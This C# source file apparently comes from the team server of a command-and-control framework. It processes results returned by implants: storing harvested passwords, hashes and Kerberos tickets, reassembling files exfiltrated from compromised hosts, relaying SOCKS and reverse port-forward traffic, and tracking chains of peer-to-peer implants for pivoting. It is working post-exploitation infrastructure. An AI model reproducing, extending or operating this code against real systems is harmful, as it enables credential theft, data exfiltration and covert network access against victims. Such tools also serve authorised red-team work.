using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Models;
using TeamServer.Models.Engineers.TaskResultTypes;
using TeamServer.Models.Extras;
using TeamServer.Services;
using TeamServer.Services.Handle_Implants;
//using DynamicEngLoading;

namespace TeamServer.Utilities
{
    public class Engineer_TaskPostProcess
    {

        public static async Task PostProcessTask()
        {
            

        }
        
        public static async Task PostProcess_CredTask(EngineerTaskResult result)
        {
            var CredsList = new List<Cred>();
            
            var capturedCreds = CapturedCredential.ParseCredentials(result.Result.Deserialize<MessageData>().Message);
            // for each credential in the list of captured credentials convert it to a Cred object, where CapturedCredential.Type is the Cred.Type and the Cred.Value is either the CapturedCredential Hash,Password, or ticket depending on type
            foreach (var cred in capturedCreds)
            {
                if (cred.Type == CredentialType.Password)
                {
                    //convert the cred object to a CapturedPasswordCredential
                    var passwordCred = (CapturedPasswordCredential)cred;
                    var credObject = new Cred { Domain = passwordCred.Domain, Name = passwordCred.Username, Type = Cred.CredType.password, CredentialValue = passwordCred.Password };
                    CredsList.Add(credObject);
                }
                else if (cred.Type == CredentialType.Hash)
                {
                    //convert the cred object to a CapturedHashCredential
                    var hashCred = (CapturedHashCredential)cred;
                    var credObject = new Cred { Domain = hashCred.Domain, Name = hashCred.Username, Type = Cred.CredType.hash, CredentialValue = hashCred.Hash, SubType = hashCred.HashCredentialType.ToString() };
                    CredsList.Add(credObject);
                }
                else if (cred.Type == CredentialType.Ticket)
                {
                    //convert the cred object to a CapturedTicketCredential
                    var ticketCred = (CapturedTicketCredential)cred;
                    var credObject = new Cred { Domain = ticketCred.Domain, Name = ticketCred.Username, Type = Cred.CredType.ticket, CredentialValue = ticketCred.Ticket, SubType = ticketCred.TicketCredentialType.ToString() };
                    CredsList.Add(credObject);
                }
            }
            //if CredsList is not empty then call HardHardHub.AddCreds
            if (CredsList.Count > 0)
            {
                //set to true cause these creds should be fresh and need to be placed in the db for backup
                await HardHatHub.AddCreds(CredsList,true);
            }
        }
     
        public static async Task PostProcess_DownloadTask(EngineerTaskResult result,string hostname)
        {
            try
            {
                var finalByteArray = new byte[0];
                FilePart part = result.Result.Deserialize<FilePart>();
                if(!FilePart.FinalFileTracking.ContainsKey(result.Id))
                {
                    FilePart.FinalFileTracking.Add(result.Id, finalByteArray);
                }
                
                  
                Handle_Engineer.CommandIds[result.Id].Arguments.TryGetValue("/file", out string filename);
                // get the last word in the filename string and update filename to that
                var fileNameSplit = filename.Split("\\").Last();

                if (part.Type != 2)
                {
                    //remove result from results 
                    Handle_Engineer.results = Handle_Engineer.results.Where(val => val != result);
                    FilePart.FinalFileTracking[result.Id] = FilePart.FinalFileTracking[result.Id].Concat(part.Data).ToArray();
                }
                else if (part.Type == 2)
                {
                    char allPlatformPathSeperator = Path.DirectorySeparatorChar;
                    // find the Engineer cs file and load it to a string so we can update it and then run the compiler function on it
                    string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                    //split path at bin keyword
                    string[] pathSplit = path.Split("bin"); //[0] is the parent folder [1] is the bin folder
                                                            //update each string in the array to replace \\ with the correct path seperator
                    pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());

                    System.IO.File.WriteAllBytes(pathSplit[0] + "Downloads" + $"{allPlatformPathSeperator}{fileNameSplit}", FilePart.FinalFileTracking[result.Id]);
                    Handle_Engineer.CommandIds.Remove(result.Id);
                    FilePart.FinalFileTracking.Remove(result.Id);
                    MessageData newResultMessage = new MessageData();
                    newResultMessage.Message = "Successfully downloaded file check the downloads folder on the ts or the downloads tab on the client to sync up.";
                    result.Result = newResultMessage.Serialize();
                    DownloadFile file = new DownloadFile();
                    file.Name = fileNameSplit;
                    file.OrginalPath = filename;
                    if (file.OrginalPath.StartsWith("\\\\"))
                    {
                        string hostpath = file.OrginalPath.Split("\\")[2];
                        file.Host = hostpath;
                    }
                    else
                    {
                        file.Host = hostname;
                    }
                    file.SavedPath = pathSplit[0] + "Downloads" + $"{allPlatformPathSeperator}{fileNameSplit}";
                    await HardHatHub.AlertDownload(file);
                }
                

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error in post process file download");
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
            
        }
         
        public static async Task PostProcess_SocksTask(EngineerTaskResult result)
        {
            try
            {
                //if result.Id is socksConnected then split the incoming result string into an array and element 1 is the client unique string and we need to update the Proxy.SocksDestinationConnected
                if (result.Command.Equals("SocksConnect", StringComparison.CurrentCultureIgnoreCase))
                {
                    string resultString = result.Result.Deserialize<MessageData>().Message;
                    var socksConnected = resultString.Split(new[] { "\n" }, StringSplitOptions.None);
                    //element 1 in the array matches a key in the SocksDestinationConnected dictionary update the value to true 
                    //find the Proxy item in the HttpmanagerController dictionary that matches the socksConnected[1] key
                    Socks4Proxy socks4Proxy = HttpmanagerController.Proxy.Select(x => x.Value).Where(x => x.SocksDestinationConnected.ContainsKey(socksConnected[1])).FirstOrDefault();
                    //Console.WriteLine($"Socks connected to client {socksConnected[1]}");
                    socks4Proxy.SocksDestinationConnected[socksConnected[1]] = true;
                    //HttpmanagerController.testProxy.SocksDestinationConnected[socksConnected[1]] = true;
                }
                
                //if result.Id is socksReceiveData then set the GotData in Socks4Proxy to true and convert the result.Result from base64 string to byte[] and assign it to the socks4Proxy resp
                else if (result.Command.Equals("socksReceive", StringComparison.CurrentCultureIgnoreCase))
                {
                    var socks_client_length = BitConverter.ToInt32(result.Result.Take(4).ToArray());
                    var socks_client = result.Result.Skip(4).Take(socks_client_length).ToArray().Deserialize<MessageData>().Message;
                    var socks_content = result.Result.Skip(4 + socks_client_length).Take(result.Result.Length - (4 + socks_client_length)).ToArray();

                    //Console.WriteLine($"teamserver received {socks_content.Length} bytes from {socks_client}");
                    Socks4Proxy socks4Proxy = HttpmanagerController.Proxy.Select(x => x.Value).Where(x => x.SocksClientsData.ContainsKey(socks_client)).FirstOrDefault();
                    socks4Proxy.SocksClientsData[socks_client].Enqueue(socks_content);
                    //HttpmanagerController.testProxy.SocksClientsData[socks_client].Enqueue(socks_content);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
        }

        public static async Task PostPorcess_RPortForward(EngineerTaskResult result)
        {
            //if result.Id is rportsend take the result.Result and split it at the new line and element 0 is the data and element 1 is the guid
            if (result.Id.Equals("rportsend", StringComparison.CurrentCultureIgnoreCase))
            {
                var split = result.Result.Deserialize<MessageData>().Message.Split(new[] { "\n" }, StringSplitOptions.None);
                byte[] temp = Convert.FromBase64String(split[0]); //split 0 is the data split 1 is the guid
                string client = split[1];
                Console.WriteLine($"teamserver received {temp.Length} bytes from {client}");
                RPortForward.RPortForwardClientsData[client].Enqueue(temp);
            }

        }

        public static async Task<string> PostProcess_P2PFirstCheckIn(EngineerTaskResult result, Engineer HttpEng)
        {
            string[] resultArray = result.Result.Deserialize<MessageData>().Message.Split('\n');
            //this is the metadata stored in the result string from the p2p implant
            string Base64Metadata = resultArray[0];
            string parentId = resultArray[1];

            if(!Handle_Engineer.PathStorage.ContainsKey(result.EngineerId))
            {
                // new engineer, key is its id, value is its path, if its parent id is equal to the http engineer then just the http engineer id is its path, otherwise check if its parent is in the HttpmanagerController.PathStorage 
                if(parentId == HttpEng.engineerMetadata.Id)
                {
                    Console.WriteLine($"adding new path of {HttpEng.engineerMetadata.Id} -> {result.EngineerId}");
                    Handle_Engineer.PathStorage.Add(result.EngineerId, new List<string> { HttpEng.engineerMetadata.Id,result.EngineerId });
                }
                else
                {
                    foreach (var kvp in Handle_Engineer.PathStorage)
                    {
                        if (kvp.Key == parentId)
                        {
                            var path = kvp.Value;
                            // this should end up making it easy to have path regradless of depth
                            //add to Handle_Engineer.PathStorage the result.EngineerId as the key and the value is each element in the path list and the result.EngineerId
                            Console.WriteLine($"adding new path of {string.Join("->", path)} -> {result.EngineerId}");
                            var temp = new List<string>();
                            path.ForEach(x => temp.Add(x));
                            Handle_Engineer.PathStorage.Add(result.EngineerId,temp);
                            Handle_Engineer.PathStorage[result.EngineerId].Add(result.EngineerId); // I was adding path here and then adding to it which updated path in both spots.
                            break;
                        }
                    }
                }
            }
            return Base64Metadata;
        }
        
        public static async Task PostProcess_IOCFileUpload(EngineerTaskResult result)
        {
            //check if result id matches any in IOCFile.PendingIOCFiles if it does then remove it from the dictionary and invoke the hub function to send it out 
            if (IOCFile.PendingIOCFiles.ContainsKey(result.Id))
            {
                IOCFile pending = IOCFile.PendingIOCFiles[result.Id];
                await HardHatHub.AddIOCFile(pending);
                IOCFile.PendingIOCFiles.Remove(result.Id);
            }
        }
    }
}
